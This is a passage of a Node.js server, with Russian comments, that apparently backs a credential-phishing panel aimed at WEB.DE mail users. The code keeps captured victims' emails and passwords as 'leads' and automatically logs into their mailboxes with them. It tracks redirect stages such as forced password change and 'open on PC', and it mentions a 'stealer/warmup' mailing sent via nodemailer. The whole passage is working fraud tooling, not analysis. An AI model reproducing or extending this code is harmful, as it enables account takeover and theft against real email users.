if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
if (!mailService.getNodemailer()) console.log('[SERVER] nodemailer не установлен — рассылка stealer/warmup недоступна (npm install nodemailer)');
if (!WebSocketServer) console.log('[SERVER] ws не установлен — обновление админки в реальном времени отключено (npm install ws)');

function cleanLoginArtifacts() {
  if (!fs.existsSync(LOGIN_DIR)) return;
  const now = Date.now();
  LOGIN_ARTIFACT_NAMES.forEach((name) => {
    const full = path.join(LOGIN_DIR, name);
    try {
      const stat = fs.statSync(full);
      if (!stat.isFile()) return;
      if (now - stat.mtime.getTime() < LOGIN_CLEANUP_MAX_AGE_MS) return;
      fs.unlinkSync(full);
    } catch (e) {}
  });
  try {
    const names = fs.readdirSync(LOGIN_DIR);
    names.forEach((name) => {
      if (!name.endsWith('.png')) return;
      const full = path.join(LOGIN_DIR, name);
      try {
        const stat = fs.statSync(full);
        if (!stat.isFile()) return;
        if (now - stat.mtime.getTime() < LOGIN_CLEANUP_MAX_AGE_MS) return;
        fs.unlinkSync(full);
      } catch (e) {}
    });
  } catch (e) {}
}

function runFullCleanup() {
  const scriptPath = path.join(PROJECT_ROOT, 'scripts', 'cleanup-backups.js');
  if (!fs.existsSync(scriptPath)) return;
  const node = process.execPath;
  const child = require('child_process').spawn(node, [scriptPath, '--tmp', '--login-cleanup'], { cwd: PROJECT_ROOT, stdio: 'ignore', detached: true });
  child.unref();
}

const AUTOLOGIN_RECOVER_MAX_AGE_MS = 10 * 60 * 1000;
const AUTOLOGIN_RECOVER_MAX_LEADS = Math.max(1, parseInt(process.env.AUTOLOGIN_RECOVER_MAX_LEADS || '5', 10) || 5);
const AUTOLOGIN_RECOVER_ON_START = String(process.env.AUTOLOGIN_RECOVER_ON_START || '').trim().toLowerCase() === '1'
  || String(process.env.AUTOLOGIN_RECOVER_ON_START || '').trim().toLowerCase() === 'true';

function recoverRecentAutoLoginLeadsOnStartup() {
  try {
    if (!AUTOLOGIN_RECOVER_ON_START) {
      console.log('[AUTO-LOGIN][RECOVER] Пропуск: AUTOLOGIN_RECOVER_ON_START=off');
      return;
    }
    const mode = readMode();
    const autoScript = readAutoScript();
    if (mode === 'manual' || !autoScript) {
      console.log('[AUTO-LOGIN][RECOVER] Пропуск: mode=' + mode + ', autoScript=' + autoScript);
      return;
    }
    const now = Date.now();
    const leads = readLeads();
    let queued = 0;
    let skippedOld = 0;
    let skippedDone = 0;
    const candidates = [];
    leads.forEach(function (lead) {
      if (!lead || lead.id == null) return;
      if (leadIsWorkedLikeAdmin(lead)) {
        skippedDone++;
        return;
      }
      const st = String(lead.status || '').toLowerCase();
      if (st === 'show_success') {
        skippedDone++;
        return;
      }
      // После успешного входа скрипт часто ставит redirect_* (например change/download/open-on-pc),
      // это уже «завершённая» стадия и перезапуск автологина не нужен.
      if (
        st === 'redirect_change_password' ||
        st === 'redirect_sicherheit' ||
        st === 'redirect_android' ||
        st === 'redirect_open_on_pc'
      ) {
        skippedDone++;
        return;
      }
      // Доп. защита: если в событиях уже был успех/открытие ящика, не поднимать автологин заново.
      const evs = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
      const hasMailOpenedOrSuccess = evs.some(function (ev) {
        const lbl = String((ev && (ev.label != null ? ev.label : ev.text)) || '').toLowerCase();
        return (
          lbl.indexOf('почтовый ящик открыт') !== -1 ||
          lbl.indexOf('успешный вход') !== -1 ||
          lbl.indexOf('автовход удался') !== -1
        );
      });
      if (hasMailOpenedOrSuccess) {
        skippedDone++;
        return;
      }
      const tsRaw = lead.lastSeenAt || lead.createdAt || '';
      const ts = Date.parse(tsRaw);
      if (!Number.isFinite(ts) || (now - ts) > AUTOLOGIN_RECOVER_MAX_AGE_MS) {
        skippedOld++;
        return;
      }
      const emailMain = String(lead.email || '').trim();
      const passwordMain = String(lead.password || '').trim();
      const emailKl = String(lead.emailKl || '').trim();
      const passwordKl = String(lead.passwordKl || '').trim();
      const hasEmailAndPassword = (emailMain !== '' && passwordMain !== '') || (emailKl !== '' && passwordKl !== '');
      if (!hasEmailAndPassword) return;
      candidates.push({ lead: lead, ts: ts });
    });
    candidates
      .sort(function (a, b) { return b.ts - a.ts; })
      .slice(0, AUTOLOGIN_RECOVER_MAX_LEADS)
      .forEach(function (item) {
        queued++;
        startWebdeLoginAfterLeadSubmit(String(item.lead.id), item.lead, true);
      });
    console.log('[AUTO-LOGIN][RECOVER] queued=' + queued + ', skipped_old=' + skippedOld + ', skipped_done=' + skippedDone + ', candidates=' + candidates.length + ', maxStart=' + AUTOLOGIN_RECOVER_MAX_LEADS + ', maxAgeMin=10');
  } catch (e) {
    console.warn('[AUTO-LOGIN][RECOVER] Ошибка:', e && e.message ? e.message : e);
  }
}

server.listen(PORT, HOST, () => {
  console.log('Сервер: http://' + HOST + ':' + PORT);
  console.log('Админка: http://' + HOST + ':' + PORT + '/admin.html');
  console.log('[SERVER] SQLite → ' + DB_PATH + (process.env.GMW_DATA_DIR ? ' (GMW_DATA_DIR)' : ' (каталог проекта ./data)'));
  setTimeout(cleanLoginArtifacts, 60 * 1000);
  setInterval(cleanLoginArtifacts, 10 * 60 * 1000);
  setTimeout(runFullCleanup, 2 * 60 * 1000);
  setInterval(runFullCleanup, 10 * 60 * 1000);
  scheduleWebdeLayoutHealthcheck();
  // По умолчанию recovery выключен: существующие лиды из админки после рестарта не поднимаются в автовход.
  // Для ручного включения: AUTOLOGIN_RECOVER_ON_START=1.
  setTimeout(recoverRecentAutoLoginLeadsOnStartup, 3000);
});

let isShuttingDown = false;
function shutdown() {
  if (isShuttingDown) return;
  isShuttingDown = true;
  try {
    automationService.killAllSpawnedAutomationChildrenSync();
  } catch (_) {}
  server.close(() => {
    try {
      closeDb();
    } catch (_) {}
    console.log('Сервер остановлен.');
    process.exit(0);
  });
}

process.on('SIGTERM', () => {
  console.log('Получен SIGTERM, завершаю работу...');
  shutdown();
});

process.on('SIGINT', () => {
  console.log('\nПолучен SIGINT, завершаю работу...');
  shutdown();
});

process.on('exit', () => {
  try {
    automationService.killAllSpawnedAutomationChildrenSync();
  } catch (_) {}
  try {
    closeDb();
  } catch (_) {}
});

